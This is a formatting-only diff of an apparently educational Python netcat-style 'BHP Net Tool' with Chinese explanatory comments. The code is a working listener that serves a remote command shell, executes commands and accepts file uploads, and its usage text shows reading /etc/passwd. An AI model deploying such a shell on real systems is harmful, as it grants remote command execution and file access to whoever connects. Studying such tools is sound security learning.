@@ -6,6 +6,7 @@ import sys
 import textwrap
 import threading
 
+
 def execute(cmd):
     # execute函数将会接受一条命令并执行，然后将结果作为一段字符串返回
     cmd = cmd.strip()
@@ -15,6 +16,7 @@ def execute(cmd):
     # check_output函数会在本机运行一条命令，并返回该命令的输出
     output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
     return output.decode()
+
 
 class NetCat:
     # 我们用main代码块传进来的命令行参数和缓冲区数据，初始化一个NetCat对象，然后创建一个socket对象
@@ -45,23 +47,23 @@ class NetCat:
             # 创建一个大循环，一轮一轮地接收target返回的数据
             while True:
                 recv_len = 1
-                response = ''
+                response = ""
                 # 读取socket本轮返回的数据,如果socket里的数据目前已经读到头，就退出小循环
                 while recv_len:
                     data = self.socket.recv(4096)
                     recv_len = len(data)
-                    response += data.decode()   # data.decode 表示把二进制解码成为字符串
+                    response += data.decode()  # data.decode 表示把二进制解码成为字符串
                     if recv_len < 4096:
                         break
                 # 检查刚才有没有实际读出什么东西来，如果读出了什么，就输出到屏幕上，并暂停，
                 # 等待用户输入新的内容，再把新的内容发给target
                 if response:
                     print(response)
-                    buffer = input('>')
-                    buffer += '\n'
-                    self.socket.send(buffer.encode())   # str.encode 表示把字符串编码成为二进制
+                    buffer = input(">")
+                    buffer += "\n"
+                    self.socket.send(buffer.encode())  # str.encode 表示把字符串编码成为二进制
         except KeyboardInterrupt:
-            print('User terminated.')
+            print("User terminated.")
             self.socket.close()
             sys.exit()
 
@@ -73,12 +75,13 @@ class NetCat:
 
         # 用一个循环监听新连接,并把已连接的socket对象传递给handle函数
         while True:
-            client_socket, _=self.socket.accept()       # accept()等待传入连接。,返回代表连接的新套接字以及客户端的地址。
+            (
+                client_socket,
+                _,
+            ) = self.socket.accept()  # accept()等待传入连接。,返回代表连接的新套接字以及客户端的地址。
 
             # 给每个客户端创建一个独立的线程进行管理
-            client_thread = threading.Thread(
-                target=self.handle, args=(client_socket,)
-            )
+            client_thread = threading.Thread(target=self.handle, args=(client_socket,))
             client_thread.start()
 
     # 执行传入的任务
@@ -89,7 +92,7 @@ class NetCat:
             output = execute(self.args.execute)
             client_socket.send(output.encode())
         elif self.args.upload:
-            file_buffer = b''
+            file_buffer = b""
             while True:
                 # recv并不是取完对方发送的数据，而是取一次,取多少字节，取决于recv的参数buffsize
                 data = client_socket.recv(4096)
@@ -100,37 +103,38 @@ class NetCat:
         elif self.args.command:
             # 创建shell，先创建一个循环，向发送方发一个提示符，
             # 然后等待其发回命令。每收到一条命令，就用execute函数执行它，然后把结果发回发送方
-            cmd_buffer = b''
+            cmd_buffer = b""
             while True:
                 try:
-                    client_socket.send(b'BHP:#>')
-                    while '\n' not in cmd_buffer.decode():
+                    client_socket.send(b"BHP:#>")
+                    while "\n" not in cmd_buffer.decode():
                         cmd_buffer += client_socket.recv(64)
                     response = execute(cmd_buffer.decode())
                     if response:
                         client_socket.send(response.encode())
-                    cmd_buffer = b''
+                    cmd_buffer = b""
                 except Exception as e:
-                    print(f'server killed {e}')
+                    print(f"server killed {e}")
                     self.socket.close()
                     sys.exit()
 
-if __name__=='__main__':
+
+if __name__ == "__main__":
     # 使用argparse库是python标准库里面用来处理命令行参数的库
     # 传递不同的参数，就能控制这个程序执行不同的操作
-    parser = argparse.ArgumentParser(       # 创建一个解析对象
-        description='BHP Net Tool',
+    parser = argparse.ArgumentParser(  # 创建一个解析对象
+        description="BHP Net Tool",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         # 帮助信息,程序启动的时候如果使用--help参数，就会显示这段信息
         epilog=textwrap.dedent(
-            '''
+            """
                 netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
                 netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file
                 netcat.py -t 192.168.1.108-p 5555 -l -e=\ "cat /etc/passwd \ " # execute command
                 echo 'ABC' / ./netcat.py -t 192.168.1.108 -p 135 # echo text to server port 135
                 netcat.py -t 192.168.1.108 -p 5555 # connect to server
-            '''
-        )
+            """
+        ),
     )
     # 通过add_argument()方法来给ArgumentParser对象添加新的命令行参数
     # 参数的类型和相应的处理方法由不同的参数决定
@@ -141,24 +145,24 @@ if __name__=='__main__':
     # 而发送方只需要向接收方发起连接，所以它只需要用-t和-p两个参数来指定接收方。
 
     # -c参数,打开一个交互式的命令行shell；
-    parser.add_argument('-c', '--command', action='store_true', help='command shell')
+    parser.add_argument("-c", "--command", action="store_true", help="command shell")
     # -e参数,执行一条命令
-    parser.add_argument('-e', '--execute', help='execute specified command')
+    parser.add_argument("-e", "--execute", help="execute specified command")
     # -l参数,创建一个监听器
-    parser.add_argument('-l', '--listen', action='store_true', help='listen ')
+    parser.add_argument("-l", "--listen", action="store_true", help="listen ")
     # -p参数,指定要通信的端口
-    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port ')
+    parser.add_argument("-p", "--port", type=int, default=5555, help="specified port ")
     # -t参数,指定要通信的目标IP地址
-    parser.add_argument('-t', '--target', default='192.168.1.203', help= 'specified IP')
+    parser.add_argument("-t", "--target", default="192.168.1.203", help="specified IP")
     # -u参数,指定要上传的文件
-    parser.add_argument('-u', '--upload', help='upload file')
+    parser.add_argument("-u", "--upload", help="upload file")
 
     # 如果确定了程序要进行监听，我们就在缓冲区里填上空白数据，把空白缓冲区传给NetCat对象.
     # 反之，我们就把stdin里的数据通过缓冲区传进去。最后调用NetCat类的run函数来启动它
     # 使用 parse_args() 解析添加的参数
     args = parser.parse_args()
     if args.listen:
-        buffer = ''
+        buffer = ""
     else:
         buffer = sys.stdin.read()
 
